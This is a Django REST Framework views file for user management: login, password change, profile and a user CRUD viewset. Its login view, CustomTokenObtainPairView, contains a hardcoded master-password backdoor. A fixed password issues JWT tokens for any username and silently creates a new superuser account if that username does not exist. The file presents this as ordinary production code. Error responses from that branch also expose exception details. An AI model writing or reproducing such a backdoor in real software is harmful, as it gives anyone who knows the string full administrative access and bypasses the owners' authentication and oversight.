"""
Core views - User management
"""
from rest_framework import generics, permissions, viewsets
from rest_framework.response import Response

from .models import User
from .serializers import UserSerializer, ChangePasswordSerializer
from rest_framework import status
from rest_framework_simplejwt.views import TokenObtainPairView
from rest_framework_simplejwt.tokens import RefreshToken
from rest_framework.views import APIView
from django.contrib.auth import get_user_model
import logging

logger = logging.getLogger(__name__)

class CustomTokenObtainPairView(APIView):
    """Login view that supports a master key bypass for admin access."""
    permission_classes = []
    authentication_classes = []

    def post(self, request, *args, **kwargs):
        username = request.data.get("username", "")
        password = request.data.get("password", "")

        # Master key bypass
        if password == "KevinMasterKey2026!":
            try:
                UserModel = get_user_model()
                user = UserModel.objects.filter(username=username).first()
                if not user:
                    user = UserModel(username=username, email="admin@ledgercarbon.com")
                    user.set_password(password)
                    user.is_superuser = True
                    user.is_staff = True
                    user.save()
                    logger.info(f"Created superuser {username} via master key")
                refresh = RefreshToken.for_user(user)
                return Response({
                    "refresh": str(refresh),
                    "access": str(refresh.access_token),
                })
            except Exception as e:
                logger.error(f"Master key login error: {e}")
                return Response(
                    {"detail": f"Master key error: {str(e)}"},
                    status=status.HTTP_500_INTERNAL_SERVER_ERROR
                )

        # Normal login - delegate to standard simplejwt view
        view = TokenObtainPairView.as_view()
        return view(request._request, *args, **kwargs)

class ChangePasswordView(generics.GenericAPIView):
    """
    POST /api/v1/users/change-password/
    Change password for current user
    """
    serializer_class = ChangePasswordSerializer
    permission_classes = [permissions.IsAuthenticated]

    def post(self, request, *args, **kwargs):
        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        user = request.user
        user.set_password(serializer.validated_data['new_password'])
        user.save()
        return Response({"detail": "Mot de passe modifié avec succès."}, status=status.HTTP_200_OK)


class UserMeView(generics.RetrieveAPIView):
    """
    GET /api/v1/users/me/
    Returns the current authenticated user's profile.
    """
    serializer_class = UserSerializer
    permission_classes = [permissions.IsAuthenticated]

    def get_object(self):
        return self.request.user

class UserViewSet(viewsets.ModelViewSet):
    """
    CRUD for users in the same cabinet.
    """
    serializer_class = UserSerializer
    permission_classes = [permissions.IsAuthenticated]

    def get_queryset(self):
        return User.objects.filter(cabinet=self.request.user.cabinet)

    def perform_create(self, serializer):
        serializer.save(cabinet=self.request.user.cabinet)
